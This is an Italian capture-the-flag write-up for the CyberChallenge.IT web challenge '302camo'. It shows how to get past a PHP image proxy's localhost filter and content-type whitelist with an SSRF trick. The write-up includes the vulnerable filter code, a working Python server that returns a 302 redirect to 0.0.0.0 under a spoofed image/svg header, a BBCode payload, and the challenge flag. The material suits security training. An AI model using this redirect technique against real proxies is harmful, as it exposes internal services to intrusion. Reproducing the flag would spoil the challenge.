# Writeup: WS_1.06 - 302camo

## Overview
- **Categoria**: Web  
- **Autore**: bonaff  
- **Difficoltà**: 497  
- **Stato**: Up (last checked: 5 minutes ago)  
- **URL**: [http://302camo.challs.cyberchallenge.it](http://302camo.challs.cyberchallenge.it)

## Descrizione 📝
La challenge mostra un semplice **PHP blog** in cui si possono inserire post con un formato **BBCode** che include tag come `[img]URL[/img]`. Ogni immagine viene caricata tramite `camo.php`, che effettua alcune verifiche:
1. **Blocca** l’accesso a `127.x.x.x` (niente localhost).
2. **Verifica** che il `Content-Type` della risorsa remota sia un’immagine, fra un ristretto elenco (`image/png`, `image/jpg`, `image/svg`, `image/gif`).

L’obiettivo è accedere alla risorsa interna `/get_flag.php`, che non è direttamente esposta su internet, sfruttando la logica di `camo.php`.

## Soluzione 🎯

### 1. Analisi di `camo.php`
```php
$hostname = parse_url($url, PHP_URL_HOST);
$ip = gethostbyname($hostname);

if(strncmp($ip, '127', 3) === 0){
    die('no localhost!');
}

// ...
$headers = $http_response_header;
$whitelist = ['image/png', 'image/jpg', 'image/svg', 'image/gif'];

foreach($headers as $header){
   if(startsWith($header, 'Content-Type')){
        $value = substr($header, strlen('Content-Type: '));
        if(in_array($value, $whitelist)){
            header('Content-Type: ' . $value);
            break;
        }else{
            die('File type not permitted');
        }
    }
}
echo $response;
```
`camo.php` recupera l’URL fornito, controlla l’IP risolto (niente `127.x.x.x`), e assicura che il `Content-Type` remoto sia un’immagine.

### 2. L’Idea del Redirect (HTTP 302)
Possiamo sfruttare un **redirect** verso `0.0.0.0/get_flag.php` (che è un alias di `127.0.0.1`, ma non inizia con `127`, e quindi non viene bloccato). Tuttavia, dobbiamo **fingere** che la risorsa sia un’immagine (es. `image/svg`).

### 3. Setup di un Server Intermedio
Usiamo **ngrok** per esporre localmente un server HTTP:
```bash
ngrok http 8000
```
Poi creiamo uno **script Python** che, ogni volta che riceve una richiesta, risponde con:
1. **HTTP/1.1 302 Found**  
2. **Location**: `http://0.0.0.0/get_flag.php`  
3. **Content-Type**: `image/svg`  

```python
import http.server
import socketserver

class CustomTCPServer(socketserver.TCPServer):
    allow_reuse_address = True

class CustomHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header("Content-Type", "image/svg")
        self.send_header("Location", "http://0.0.0.0/get_flag.php")
        self.end_headers()

if __name__ == "__main__":
    PORT = 8000
    with CustomTCPServer(("", PORT), CustomHandler) as httpd:
        print(f"Server in esecuzione sulla porta {PORT}...")
        httpd.serve_forever()
```

### 4. Inserimento del Payload nel Blog
Nel blog, creiamo un nuovo post con il tag `[img]` che punta al nostro URL ngrok (ad es. `https://abcd-1234-xyz.ngrok-free.app`):
```
[img]https://abcd-1234-xyz.ngrok-free.app[/img]
```
Quando `camo.php` recupera quest’immagine, il nostro server restituirà un **302** che punta a `http://0.0.0.0/get_flag.php` con `Content-Type: image/svg`. `camo.php` non bloccherà `0.0.0.0`, e troverà un header `Content-Type: image/svg`, considerandolo valido.

### 5. Risultato: Flag
Il server interno (localhost) ci restituirà quindi un file `camo.php`, con la flag:

## Flag 🏁
```
CCIT{PHP_s0met1ms_1ts_funn1}
```

## Lezioni Apprese 📚
1. **Bypass IP Filter**: Usare `0.0.0.0` al posto di `127.0.0.1` è un classico trucco.  
2. **Content-Type Spoofing**: Restituire un header `Content-Type` whitelisted per ingannare `camo.php`.  
3. **HTTP 302**: Un redirect opportunamente configurato permette di puntare a risorse interne al server.

## Tools Utilizzati 🛠️
- **Python**: Per creare un server che risponde con 302 e `Content-Type: image/svg`.  
- **ngrok**: Per esporre il server localmente.  
- **Browser**: Per inserire il post e visualizzare la flag.

---

*Writeup by Luca Crippa - Last Updated: 2024*
